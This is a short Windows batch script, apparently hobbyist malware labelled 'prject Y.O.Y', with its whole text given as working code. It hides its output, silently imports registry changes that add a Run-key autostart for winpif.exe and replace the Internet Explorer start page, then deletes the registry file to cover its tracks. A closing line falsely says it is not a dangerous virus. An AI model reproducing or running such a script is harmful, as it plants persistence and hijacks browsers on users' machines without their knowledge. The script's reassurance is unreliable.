@echo off
ctty nul
echo REGEDIT4>C:\yoy.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]>>C:\yoy.reg
echo "winpif"="c:\\windows\\winpif.exe" >> C:\yoy.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main]>>C:\yoy.reg
echo "Start Page"="c:\\windows\\system32\\news.htm" >> C:\yoy.reg
regedit /s C:\yoy.reg
del C:\yoy.reg
ctty con
cls
c:\windows\iniwin.txt
prject Y.O.Y
version 1.0,It not dangerous virus, dont worry be happy.	